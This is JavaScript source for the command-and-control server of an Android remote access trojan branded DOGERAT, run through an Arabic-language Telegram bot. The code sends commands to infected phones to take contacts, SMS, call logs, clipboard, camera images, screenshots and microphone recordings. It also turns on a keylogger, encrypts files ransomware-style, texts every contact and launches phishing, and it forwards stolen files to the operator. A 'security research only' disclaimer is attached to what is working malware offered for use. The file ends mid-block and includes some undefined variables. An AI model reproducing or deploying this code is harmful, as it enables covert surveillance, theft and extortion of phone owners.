const express = require("express");
const http = require("http");
const {
  Server
} = require("socket.io");
const telegramBot = require("node-telegram-bot-api");
const https = require("https");
const multer = require("multer");
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = new Server(server);
const uploader = multer();
const data = JSON.parse(fs.readFileSync("./data.json", "utf8"));

const bot = new telegramBot(data.token, {
  'polling': true,
  'request': {}
});

const appData = new Map();

// قائمة الأوامر - جميعها متاحة مجاناً
const actions = [
  "✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯", "✯ المكالمات ✯", "✯ التطبيقات ✯",
  "✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯", "✯ الميكروفون ✯", "✯ الحافظة ✯",
  "✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯", "✯ إرسال رسالة ✯", "✯ اهتزاز ✯",
  "✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯", "✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯",
  "✯ مستكشف الملفات ✯", "✯ المعرض ✯", "✯ تشفير ✯", "✯ فك التشفير ✯",
  "✯ إرسال رسالة لجميع جهات الاتصال ✯", "✯ إشعار منبثق ✯", "✯ فتح رابط ✯",
  "✯ تصيد احتيالي ✯", "✯ العودة للقائمة الرئيسية ✯"
];

app.post("/upload", uploader.single('file'), (_0xe7d0f6, _0x30973d) => {
  const _0x1763f6 = _0xe7d0f6.file.originalname;
  const _0x3abcf4 = _0xe7d0f6.headers.model;
  bot.sendDocument(data.id, _0xe7d0f6.file.buffer, {
    'caption': "<b>✯ ملف مستلم من → " + _0x3abcf4 + '</b>',
    'parse_mode': "HTML"
  }, {
    'filename': _0x1763f6,
    'contentType': "*/*"
  });
  _0x30973d.send("تم الاستلام");
});

app.get("/text", (_0x5b9a91, _0x340799) => {
  _0x340799.send(data.text);
});

io.on("connection", _0x48afef => {
  let _0x35d854 = _0x48afef.handshake.headers.model + '-' + io.sockets.sockets.size || "لا توجد معلومات";
  let _0x3e1fde = _0x48afef.handshake.headers.version || "لا توجد معلومات";
  let _0x4c49f4 = _0x48afef.handshake.headers.ip || "لا توجد معلومات";
  _0x48afef.model = _0x35d854;
  _0x48afef.version = _0x3e1fde;

  let _0x5ede9b = "<b>✯ جهاز جديد متصل</b>\n\n" +
    "<b>النوع</b> → " + _0x35d854 + "\n" +
    "<b>الإصدار</b> → " + _0x3e1fde + "\n" +
    "<b>عنوان الـ IP</b> → " + _0x4c49f4 + "\n" +
    "<b>الوقت</b> → " + _0x48afef.handshake.time + "\n\n";

  bot.sendMessage(data.id, _0x5ede9b, {
    'parse_mode': "HTML"
  });

  _0x48afef.on("disconnect", () => {
    let _0x4c86f2 = "<b>✯ انقطع اتصال جهاز</b>\n\n" +
      "<b>النوع</b> → " + _0x35d854 + "\n" +
      "<b>الإصدار</b> → " + _0x3e1fde + "\n" +
      "<b>عنوان الـ IP</b> → " + _0x4c49f4 + "\n" +
      "<b>الوقت</b> → " + _0x48afef.handshake.time + "\n\n";
    bot.sendMessage(data.id, _0x4c86f2, {
      'parse_mode': "HTML"
    });
  });

  _0x48afef.on("message", _0x44fcc5 => {
    bot.sendMessage(data.id, "<b>✯ رسالة مستلمة من → " + _0x35d854 + "\n\nالمحتوى → </b>" + _0x44fcc5, {
      'parse_mode': "HTML"
    });
  });
});

bot.on("message", _0xdbde0c => {
  if (_0xdbde0c.text === "/start") {
    bot.sendMessage(data.id,
      "<b>✯ مرحباً بك في DOGERAT - النسخة الكاملة المجانية</b>\n\n" +
      "جميع الميزات متاحة بالكامل مجاناً لأغراض التحليل الأمني فقط\n" +
      "أي استخدام خاطئ يقع على مسؤولية المستخدم وحده!",
      {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [
            ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
            ["✯ حولنا ✯"]
          ],
          'resize_keyboard': true
        }
      }
    );
  } else {
    if (appData.get("currentAction") === "microphoneDuration") {
      let _0x3376c5 = _0xdbde0c.text;
      let _0x44b92e = appData.get('currentTarget');
      if (_0x44b92e == "all") {
        io.sockets.emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': _0x3376c5
          }]
        });
      } else {
        io.to(_0x44b92e).emit("commend", {
          'request': "microphone",
          'extras': [{
            'key': "duration",
            'value': _0x3376c5
          }]
        });
      }
      appData.delete("currentTarget");
      appData.delete("currentAction");
      bot.sendMessage(data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
              ["✯ حولنا ✯"]
            ],
            'resize_keyboard': true
          }
        }
      );
    } else if (appData.get("currentAction") === "toastText") {
      let _0x3f8601 = _0xdbde0c.text;
      let _0x5c0cc9 = appData.get('currentTarget');
      if (_0x5c0cc9 == "all") {
        io.sockets.emit("commend", {
          'request': "toast",
          'extras': [{
            'key': "text",
            'value': _0x3f8601
          }]
        });
      } else {
        io.to(_0x5c0cc9).emit("commend", {
          'request': "toast",
          'extras': [{
            'key': "text",
            'value': _0x3f8601
          }]
        });
      }
      appData.delete("currentTarget");
      appData.delete("currentAction");
      bot.sendMessage(data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
              ["✯ حولنا ✯"]
            ],
            'resize_keyboard': true
          }
        }
      );
    } else if (appData.get("currentAction") === "smsNumber") {
      let _0x16b4e5 = _0xdbde0c.text;
      appData.set("currentNumber", _0x16b4e5);
      appData.set("currentAction", 'smsText');
      bot.sendMessage(data.id,
        "<b>✯ الآن أدخل الرسالة التي تريد إرسالها إلى " + _0x16b4e5 + "</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ إلغاء الإجراء ✯"]
            ],
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        }
      );
    } else if (appData.get("currentAction") === "smsText") {
      let _0x6d597e = _0xdbde0c.text;
      let _0x1c124a = appData.get("currentNumber");
      let _0x49a537 = appData.get("currentTarget");
      if (_0x49a537 == "all") {
        io.sockets.emit("commend", {
          'request': "sendSms",
          'extras': [{
            'key': "number",
            'value': _0x1c124a
          }, {
            'key': "text",
            'value': _0x6d597e
          }]
        });
      } else {
        io.to(_0x49a537).emit("commend", {
          'request': "sendSms",
          'extras': [{
            'key': "number",
            'value': _0x1c124a
          }, {
            'key': "text",
            'value': _0x6d597e
          }]
        });
      }
      appData.delete('currentTarget');
      appData.delete("currentAction");
      appData.delete("currentNumber");
      bot.sendMessage(data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
              ["✯ حولنا ✯"]
            ],
            'resize_keyboard': true
          }
        }
      );
    } else if (appData.get("currentAction") === "vibrateDuration") {
      let _0x26f07c = _0xdbde0c.text;
      let _0x3275f8 = appData.get("currentTarget");
      if (_0x3275f8 == "all") {
        io.sockets.emit("commend", {
          'request': "vibrate",
          'extras': [{
            'key': "duration",
            'value': _0x26f07c
          }]
        });
      } else {
        io.to(_0x3275f8).emit("commend", {
          'request': "vibrate",
          'extras': [{
            'key': "duration",
            'value': _0x26f07c
          }]
        });
      }
      appData.delete("currentTarget");
      appData.delete("currentAction");
      bot.sendMessage(data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
              ["✯ حولنا ✯"]
            ],
            'resize_keyboard': true
          }
        }
      );
    } else if (appData.get("currentAction") === "textToAllContacts") {
      let _0x535777 = _0xdbde0c.text;
      let _0x3b22c4 = appData.get("currentTarget");
      if (_0x3b22c4 == "all") {
        io.sockets.emit("commend", {
          'request': "smsToAllContacts",
          'extras': [{
            'key': "text",
            'value': _0x535777
          }]
        });
      } else {
        io.to(_0x3b22c4).emit("commend", {
          'request': "smsToAllContacts",
          'extras': [{
            'key': "text",
            'value': _0x535777
          }]
        });
      }
      appData.delete("currentTarget");
      appData.delete("currentAction");
      bot.sendMessage(data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
              ["✯ حولنا ✯"]
            ],
            'resize_keyboard': true
          }
        }
      );
    } else if (appData.get("currentAction") === "notificationText") {
      let _0x371a40 = _0xdbde0c.text;
      appData.set("currentNotificationText", _0x371a40);
      if (target == "all") {
        io.sockets.emit("commend", {
          'request': "popNotification",
          'extras': [{
            'key': "text",
            'value': _0x371a40
          }]
        });
      } else {
        io.to(target).emit("commend", {
          'request': 'popNotification',
          'extras': [{
            'key': "text",
            'value': _0x371a40
          }, {
            'key': "url",
            'value': url
          }]
        });
      }
      appData.delete('currentTarget');
      appData.delete("currentAction");
      appData.delete("currentNotificationText");
      bot.sendMessage(data.id,
        "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n",
        {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
              ["✯ حولنا ✯"]
            ],
            'resize_keyboard': true
          }
        }
      );
    } else if (_0xdbde0c.text === "✯ الأجهزة ✯") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>✯ لا يوجد أي جهاز متصل حالياً</b>\n\n", {
          'parse_mode': "HTML"
        });
      } else {
        let _0x1e2656 = "<b>✯ عدد الأجهزة المتصلة: " + io.sockets.sockets.size + "</b>\n\n";
        let _0x518a8a = 1;
        io.sockets.sockets.forEach((_0x3479dd, _0x29c6f5, _0x222cae) => {
          _0x1e2656 += "<b>الجهاز " + _0x518a8a + "</b>\n" +
            "<b>النوع</b> → " + _0x3479dd.model + "\n" +
            "<b>الإصدار</b> → " + _0x3479dd.version + "\n" +
            "<b>عنوان الـ IP</b> → " + _0x3479dd.ip + "\n" +
            "<b>الوقت</b> → " + _0x3479dd.handshake.time + "\n\n";
          _0x518a8a += 1;
        });
        bot.sendMessage(data.id, _0x1e2656, {
          'parse_mode': "HTML"
        });
      }
    } else if (_0xdbde0c.text === "✯ الإجراءات ✯") {
      if (io.sockets.sockets.size === 0) {
        bot.sendMessage(data.id, "<b>✯ لا يوجد أي جهاز متصل حالياً</b>\n\n", {
          'parse_mode': "HTML"
        });
      } else {
        let _0x307c8a = [];
        io.sockets.sockets.forEach((_0x6307e5, _0x56439e, _0x42b7c1) => {
          _0x307c8a.push([_0x6307e5.model]);
        });
        _0x307c8a.push(["✯ الكل ✯"]);
        _0x307c8a.push(["✯ العودة للقائمة الرئيسية ✯"]);
        bot.sendMessage(data.id, "<b>✯ اختر الجهاز الذي تريد تنفيذ الإجراء عليه</b>\n\n", {
          'parse_mode': 'HTML',
          'reply_markup': {
            'keyboard': _0x307c8a,
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        });
      }
    } else if (_0xdbde0c.text === "✯ حولنا ✯") {
      bot.sendMessage(data.id,
        "<b>✯ DOGERAT - نسخة مجانية كاملة</b>\n" +
        "لأغراض البحث والتوعية الأمنية فقط\n" +
        "جميع الميزات متاحة دون قيود",
        {
          'parse_mode': 'HTML'
        }
      );
    } else if (_0xdbde0c.text === "✯ العودة للقائمة الرئيسية ✯") {
      bot.sendMessage(data.id, "<b>✯ القائمة الرئيسية</b>\n\n", {
        'parse_mode': "HTML",
        'reply_markup': {
          'keyboard': [
            ["✯ الأجهزة ✯", "✯ الإجراءات ✯"],
            ["✯ حولنا ✯"]
          ],
          'resize_keyboard': true
        }
      });
    } else if (_0xdbde0c.text === "✯ إلغاء الإجراء ✯") {
      let _0x3202e5 = io.sockets.sockets.get(appData.get("currentTarget")).model;
      if (_0x3202e5 == "all") {
        bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على جميع الأجهزة المتاحة</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
              ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
              ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
              ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
              ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
              ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
              ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
              ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
              ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
              ["✯ تشفير ✯", "✯ فك التشفير ✯"],
              ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
              ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
              ["✯ إشعار منبثق ✯"],
              ["✯ العودة للقائمة الرئيسية ✯"]
            ],
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        });
      } else {
        bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على " + _0x3202e5 + "</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': {
            'keyboard': [
              ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
              ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
              ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
              ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
              ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
              ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
              ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
              ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
              ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
              ["✯ تشفير ✯", "✯ فك التشفير ✯"],
              ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
              ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
              ["✯ إشعار منبثق ✯"],
              ["✯ العودة للقائمة الرئيسية ✯"]
            ],
            'resize_keyboard': true,
            'one_time_keyboard': true
          }
        });
      }
    } else if (actions.includes(_0xdbde0c.text)) {
      let _0x3ea82b = appData.get("currentTarget");

      if (_0xdbde0c.text === "✯ جهات الاتصال ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "contacts", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': 'contacts', 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ الرسائل القصيرة ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "all-sms", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "all-sms", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ المكالمات ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "calls", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "calls", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ التطبيقات ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "apps", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "apps", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ الكاميرا الرئيسية ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "main-camera", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "main-camera", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ الكاميرا الأمامية ✯") {
        if (_0x3ea82b == 'all') io.sockets.emit("commend", { 'request': "selfie-camera", 'extras': [] });
        else io.to(_0x3ea82b).emit('commend', { 'request': "selfie-camera", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ الحافظة ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "clipboard", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "clipboard", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ لقطة شاشة ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "screenshot", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "screenshot", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ تشغيل مسجل المفاتيح ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "keylogger-on", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "keylogger-on", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ إيقاف مسجل المفاتيح ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "keylogger-off", 'extras': [] });
        else io.to(_0x3ea82b).emit('commend', { 'request': "keylogger-off", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ مستكشف الملفات ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "file-explorer", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "file-explorer", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ المعرض ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "gallery", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "gallery", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ تشفير ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "encrypt", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "encrypt", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ فك التشفير ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "decrypt", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "decrypt", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ الميكروفون ✯") {
        appData.set("currentAction", 'microphoneDuration');
        bot.sendMessage(data.id, "<b>✯ أدخل مدة تسجيل الصوت بالثواني</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ إشعار منبثق ✯") {
        appData.set("currentAction", "toastText");
        bot.sendMessage(data.id, "<b>✯ أدخل النص الذي تريد ظهوره كإشعار</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ إرسال رسالة ✯") {
        appData.set("currentAction", "smsNumber");
        bot.sendMessage(data.id, "<b>✯ أدخل رقم الهاتف المراد إرسال الرسالة إليه</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ اهتزاز ✯") {
        appData.set("currentAction", "vibrateDuration");
        bot.sendMessage(data.id, "<b>✯ أدخل مدة الاهتزاز بالثواني</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ إرسال رسالة لجميع جهات الاتصال ✯") {
        appData.set("currentAction", "textToAllContacts");
        bot.sendMessage(data.id, "<b>✯ أدخل النص المراد إرساله لجميع جهات الاتصال</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ إلغاء الإجراء ✯"]], 'resize_keyboard': true, 'one_time_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ فتح رابط ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "open-url", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "open-url", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ تصيد احتيالي ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "phishing", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "phishing", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ تشغيل صوت ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "play-audio", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "play-audio", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }

      if (_0xdbde0c.text === "✯ إيقاف الصوت ✯") {
        if (_0x3ea82b == "all") io.sockets.emit("commend", { 'request': "stop-audio", 'extras': [] });
        else io.to(_0x3ea82b).emit("commend", { 'request': "stop-audio", 'extras': [] });
        appData.delete("currentTarget");
        bot.sendMessage(data.id, "<b>✯ تم تنفيذ الطلب بنجاح، ستتلقى رد الجهاز قريباً ...\n\n✯ العودة للقائمة الرئيسية</b>\n\n", {
          'parse_mode': "HTML",
          'reply_markup': { 'keyboard': [["✯ الأجهزة ✯", "✯ الإجراءات ✯"], ["✯ حولنا ✯"]], 'resize_keyboard': true }
        });
      }
    } else {
      io.sockets.sockets.forEach((_0x22a16b, _0x30e015, _0x5acd93) => {
        if (_0xdbde0c.text === _0x22a16b.model) {
          appData.set("currentTarget", _0x30e015);
          bot.sendMessage(data.id, "<b>✯ اختر الإجراء المراد تنفيذه على " + _0x22a16b.model + "</b>\n\n", {
            'parse_mode': "HTML",
            'reply_markup': {
              'keyboard': [
                ["✯ جهات الاتصال ✯", "✯ الرسائل القصيرة ✯"],
                ["✯ المكالمات ✯", "✯ التطبيقات ✯"],
                ["✯ الكاميرا الرئيسية ✯", "✯ الكاميرا الأمامية ✯"],
                ["✯ الميكروفون ✯", "✯ الحافظة ✯"],
                ["✯ لقطة شاشة ✯", "✯ إشعار منبثق ✯"],
                ["✯ إرسال رسالة ✯", "✯ اهتزاز ✯"],
                ["✯ تشغيل صوت ✯", "✯ إيقاف الصوت ✯"],
                ["✯ تشغيل مسجل المفاتيح ✯", "✯ إيقاف مسجل المفاتيح ✯"],
                ["✯ مستكشف الملفات ✯", "✯ المعرض ✯"],
                ["✯ تشفير ✯", "✯ فك التشفير ✯"],
                ["✯ فتح رابط ✯", "✯ تصيد احتيالي ✯"],
                ["✯ إرسال رسالة لجميع جهات الاتصال ✯"],
                ["✯ إشعار منبثق ✯"],
                ["✯ العودة للقائمة الرئيسية ✯"]
              ],
              'resize_keyboard': true,
              'one_time_keyboard': true
            }
          });
        }
      });

